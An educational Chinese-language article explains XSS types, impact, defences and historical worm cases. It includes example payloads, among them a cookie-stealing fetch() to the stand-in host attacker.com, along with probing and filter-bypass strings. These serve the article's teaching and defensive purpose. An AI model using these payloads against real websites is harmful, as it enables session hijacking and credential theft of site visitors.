## XSS：网页里的"幽灵脚本"

想象一下，你打开了一个看起来很正常的网站，页面上的文字、图片都和你平时看到的一样。但就在你浏览的这几秒钟里，一段你完全看不见的恶意代码已经在后台悄悄运行了——它读走了你的 Cookie，把你的登录凭证发到了攻击者的服务器上。

这就是 **XSS（Cross-Site Scripting，跨站脚本攻击）**，中文常译为"跨站脚本"。攻击者把一段恶意的 JavaScript 代码**注入**到目标网站的页面中，当其他用户访问这个页面时，代码就在他们的浏览器里自动执行。它不攻击服务器，而是直接攻击**网站的访问者**。

## 从"夹带私货"说起：XSS 是怎么发生的

XSS 的根源和 SQL 注入如出一辙：**开发人员把用户输入的内容，未经处理就输出到了 HTML 页面上。**

举个例子，一个网站有留言板功能，用户提交的评论会直接显示在页面上。如果攻击者在评论框里输入的是这样的内容：

```html
<script>alert('XSS')</script>
```

如果网站没有对这条评论做任何过滤或转义，那么所有访问这个留言板页面的用户，浏览器都会弹出一个写着"XSS"的提示框——这只是最无害的演示。换成下面的代码，事情就完全不一样了：

```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

这段代码会在页面加载时，把当前用户的 Cookie 发送到攻击者指定的服务器上。

攻击者不需要破解密码，不需要暴力撞库——用户自己浏览器里的 Cookie，被"合法"地送到了攻击者手里。有了这些 Cookie，攻击者就能**直接以该用户的身份登录网站**，不需要账号密码。

## 三种 XSS：存储型、反射型、DOM 型

根据恶意脚本的"落脚点"和触发方式，XSS 可以分为三类。

### 1. 存储型 XSS（Stored XSS）——最危险

恶意脚本被**永久保存在目标网站的服务器上**（比如数据库、文件系统）。每次有人访问包含这段内容的页面时，脚本都会自动执行。

> **典型场景**：博客评论区、论坛帖子、商品评价、用户个人简介。

攻击者发表一篇包含恶意脚本的评论，网站把它存进了数据库。此后每一个打开这篇文章的用户，都会在不知不觉中执行这段脚本。**一次注入，影响所有访问者**，这是三种 XSS 中危害最大的一种。

### 2. 反射型 XSS（Reflected XSS）——最普遍

恶意脚本**不存储在服务器上**，而是作为 URL 参数的一部分，被服务器原样反射（返回）到页面中。攻击者通常需要把恶意链接发给受害者，诱骗受害者点击。

> **典型场景**：搜索框、错误页面、URL 参数直接回显。

一个正常的搜索 URL：
```
https://example.com/search?q=手机
```

攻击者构造的恶意 URL：
```
https://example.com/search?q=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

网站把搜索词原样输出到页面上："您搜索的关键词是：<script>...""。受害者的浏览器执行了这段脚本。

反射型 XSS 需要攻击者通过邮件、短信或社交平台把恶意链接发给用户，**诱导点击是传播的关键环节**。虽然单次攻击范围不如存储型广，但由于数量极多，实际危害不容低估。

### 3. DOM 型 XSS（DOM-based XSS）——最隐蔽

和前两种不同，DOM 型 XSS 的恶意代码**完全在客户端执行**，不经过服务器。它利用的是浏览器端的 JavaScript 代码直接操作 DOM 时，使用了未经验证的用户输入。

> **典型场景**：从 URL 中读取参数并通过 `innerHTML` 写入页面。

```javascript
// 页面中的 JS 代码
var name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = '欢迎 ' + name;
```

攻击者构造 URL：
```
https://example.com/#<img src=x onerror=alert('XSS')>
```

这段代码不经过服务器，直接在浏览器端被 `innerHTML` 解析并执行。由于攻击流量不经过服务器，WAF 和服务器端的过滤策略对这种攻击**完全无效**。

## XSS 能做些什么？

XSS 能在受害者的浏览器中执行任意 JavaScript 代码，这赋予了攻击者几乎"为所欲为"的能力：

1. **窃取会话凭证**：通过 `document.cookie` 读取用户的登录 Cookie，发送到攻击者的服务器。有了它，攻击者就能直接冒充用户登录。

2. **记录键盘输入**：通过 `addEventListener` 监听键盘事件，在用户输入密码、银行卡号时实时记录并发送出去。

3. **劫持页面交互**：篡改页面内容，在登录框上方插入一个假的"重新登录"弹窗，诱导用户输入账号密码。或者把"转账"按钮的目标地址换成攻击者的账户。

4. **发起请求**：在用户不知情的情况下，用受害者的身份发送请求——发帖、删帖、改密码、转账，理论上受害者能做的事，脚本都能做。

5. **传播蠕虫**：2011 年微博曾发生大规模 XSS 蠕虫事件。攻击者在用户页面注入脚本，脚本会自动关注指定账号、转发特定微博，同时把恶意代码复制到转发的微博内容中，实现指数级传播。最终导致微博全站瘫痪数小时。

## XSS 和 CSRF 的区别

很多人会把 XSS 和 CSRF 搞混，两者的区别在于：

- **XSS**：攻击者在页面中注入恶意脚本，在用户浏览器中执行，直接窃取信息或操作页面。
- **CSRF（跨站请求伪造）**：攻击者诱导已登录的用户点击一个恶意链接或访问一个恶意网站，该网站自动向目标网站发起请求，利用用户已有的 Cookie 完成非法操作。

**XSS 可以窃取 CSRF Token**，从而绕过 CSRF 防御；而 CSRF 本身不依赖 XSS，靠的是浏览器自动携带 Cookie 的机制。两者经常被组合使用——XSS 负责偷 Token 或凭证，CSRF 负责利用这个凭证发起批量操作。

## 为什么 XSS 至今仍然普遍？

XSS 漏洞被发现已有二十多年，但它依然排在 OWASP Top 10 榜单中。原因包括：

1. **前端复杂度激增**：现代前端框架（如 Vue、React）虽然提供了默认的转义机制，但 `v-html`、`dangerouslySetInnerHTML` 等"逃生门"一旦被滥用，注入风险就会卷土重来。
2. **富文本需求的矛盾**：很多业务需要用户提交带格式的内容（如加粗、图片、链接），完全禁用 HTML 不现实，而允许 HTML 就意味着需要极其严谨的过滤策略。
3. **第三方依赖的风险**：页面中嵌入的第三方 SDK、广告代码、统计脚本，如果被攻击者入侵或劫持，会直接向所有页面注入恶意代码。这是**供应链 XSS**，防御难度极高。
4. **同源策略的局限**：同源策略限制的是跨域请求的**读取**，但 XSS 是在同源页面内执行的代码，享有完全的同源权限，同源策略对它无能为力。

## 防御之道：输出转义是第一道防线

XSS 防御的核心思路是：**永远不信任用户输入的内容，在输出到 HTML 的每个位置都做正确的转义。**

### 第一层：输出转义（最根本）

根据用户数据输出的**上下文位置**，采用不同的转义策略：

| 输出位置 | 转义方式 | 示例 |
|---|---|---|
| HTML 标签内容 | HTML 实体编码 | `<` → `&lt;`，`>` → `&gt;`，`"` → `&quot;` |
| HTML 属性值 | HTML 实体编码 + 引号包裹 | `onerror=...` 会被转义为纯字符串 |
| JavaScript 字符串 | JS 转义 | `'` → `\'`，`"` → `\"`，`\` → `\\` |
| URL 参数 | URL 编码 | `<script>` → `%3Cscript%3E` |
| CSS 样式 | CSS 转义 | 禁止用户输入作为 CSS 值 |

**重要原则**：不要试图在"输入时"统一过滤，而是要在**输出时"按位置"转义**。同一个用户数据，可能在不同位置（HTML、JS、URL）以不同方式输出，需要分别处理。

### 第二层：CSP（内容安全策略）——纵深防御的最后底线

CSP 是一种浏览器安全机制，通过 HTTP 响应头告诉浏览器**哪些资源可以加载、哪些脚本可以执行**。

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
```

这个策略规定：只允许加载本站资源和指定的 CDN 资源，禁止内联脚本（`<script>` 标签中的代码）执行。

即使攻击者成功注入了一个 `<script>alert('XSS')</script>`，由于 CSP 禁止内联脚本执行，这个攻击**在浏览器层面就被拦截了**。

> **CSP 的盲点**：`<img src=x onerror=alert('XSS')>` 这类通过事件属性触发的 XSS，如果 CSP 没有配置 `'unsafe-inline'` 则不会执行。但如果启用了 `'unsafe-eval'`，`eval()` 仍然可以执行，需要谨慎配置。

CSP 的配置需要根据业务场景精细调整，过严会导致页面功能异常，过松则失去防御效果。它是**防御纵深**的一部分，不能替代输出转义，但可以提供"即使代码被注入，也无法执行"的兜底保护。

### 第三层：输入验证与过滤

- **白名单过滤**：对允许的 HTML 标签和属性进行严格白名单控制，只放行安全的标签（如 `<b>`、`<i>`、`<p>`）。推荐使用 OWASP Java HTML Sanitizer 等成熟的过滤库。
- **类型校验**：邮箱、手机号、数字等有明确格式的字段，用正则校验格式后，只取合法部分。
- **长度限制**：过长的输入往往是攻击信号，设置合理上限并截断。

**与 SQL 注入相同的是，不要依赖黑名单过滤。** 攻击者可以绕过黑名单：`<scr<script>ipt>`、`<img src=x onerror=alert(1)>` 的多种变体、Unicode 编码、HTML 实体编码等，黑名单永远堵不全。

### 第四层：Cookie 安全加固

- **HttpOnly 标记**：设置 Cookie 时添加 `HttpOnly` 属性，JavaScript 无法通过 `document.cookie` 读取该 Cookie，即使 XSS 成功，攻击者也偷不走会话 Cookie。

  ```
  Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict
  ```

- **Secure 标记**：Cookie 只在 HTTPS 连接中传输，防止中间人窃听。

- **SameSite 属性**：限制 Cookie 在跨站请求中是否发送，可有效防御 CSRF，同时降低 XSS 窃取 Cookie 后跨站使用的风险。

### 第五层：使用现代前端框架的安全特性

- React：默认会转义 JSX 中的所有变量，**除非使用 `dangerouslySetInnerHTML`**。这个 API 名字里带"危险"是有原因的，使用前必须确保内容已安全过滤。
- Vue：`{{ }}` 双花括号插值会转义 HTML，**除非使用 `v-html`**。`v-html` 的使用场景极其有限。
- Angular：默认转义所有模板绑定值。

**核心原则**：尽量避免使用任何"绕过转义"的 API。如果必须使用（例如需要展示富文本内容），请使用成熟的 HTML 净化库（如 DOMPurify）进行过滤。

## 攻击者的视角：如何快速探测 XSS 点

攻击者探测 XSS 时，最常用的"试针"方式是在输入框或 URL 参数中提交以下内容：

```
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<a href=javascript:alert(1)>click</a>
```

如果页面弹出了提示框，说明该位置存在 XSS 漏洞，攻击者就可以将 `alert(1)` 替换为真正的攻击载荷（窃取 Cookie、发送请求等）。

**但**，现代网站往往会对 `<script>` 等明显的标签做过滤。更隐蔽的探测方式包括：

- 使用不常见的标签属性触发：`<svg onload=alert(1)>`、`<video src=x onerror=alert(1)>`
- 利用编码绕过：`&#x3C;script&#x3E;` 等 HTML 实体编码
- 利用浏览器解析差异：`<scr<script>ipt>`（标签过滤后重新拼接）

**再次强调**：依赖黑名单过滤是不安全的。正确的防御是输出转义 + CSP，而不是试图穷举所有可能的绕过方式。

## 真实世界案例

### 案例一：推特蠕虫（2009）

2009 年，推特遭遇了一次经典的 XSS 蠕虫攻击。攻击者在推文中注入恶意脚本，任何查看该推文的用户都会自动转发同一条恶意推文，并关注攻击者的账号。短短几小时内，成千上万个账号被"劫持"，推特全站陷入混乱。

### 案例二：微博 XSS 蠕虫（2011）

2011 年，国内微博平台遭遇大规模 XSS 蠕虫攻击。攻击方式类似：恶意脚本通过评论或私信传播，受害者查看后自动转发并感染其粉丝，形成指数级扩散。最终导致微博全站瘫痪数小时，大量用户账号被强制重置密码。

这两个案例的共同点是：**攻击者利用了网站对用户内容的信任**——没有对用户发表的 HTML 内容做严格过滤——使得一段 JavaScript 代码成为"自我复制的病毒"。

## 总结

XSS 攻击的本质，是**数据和代码的边界被混淆了**。用户的输入被当作了页面代码来执行，从此脚本获得了和页面同等的权限——读取 Cookie、篡改内容、发起请求，几乎无所不能。

它的破坏路径是：**一个漏洞 → 一段脚本 → 所有用户的浏览器 → 数据泄露或大规模传播**。与 SQL 注入"掏空服务器"不同，XSS 掏空的是每一个访问者的浏览器和账户。

防御 XSS 没有单一方案，需要 **输出转义（核心）+ CSP（兜底）+ HttpOnly Cookie（加固）+ 框架安全特性（防呆）** 四者结合，才能真正堵住这条"幽灵"进入页面的路。

> **安全的基本原则永远不变：不信任任何用户输入，不在输出时放弃对内容的控制权。** 从 SQL 注入到 XSS，从 DDoS 到 ARP 欺骗，所有的攻击最终都指向同一个原点——协议和系统在最初设计时预设了"善意"，而攻击者恰恰利用了这份善意。信任越深的地方，破坏往往越彻底。
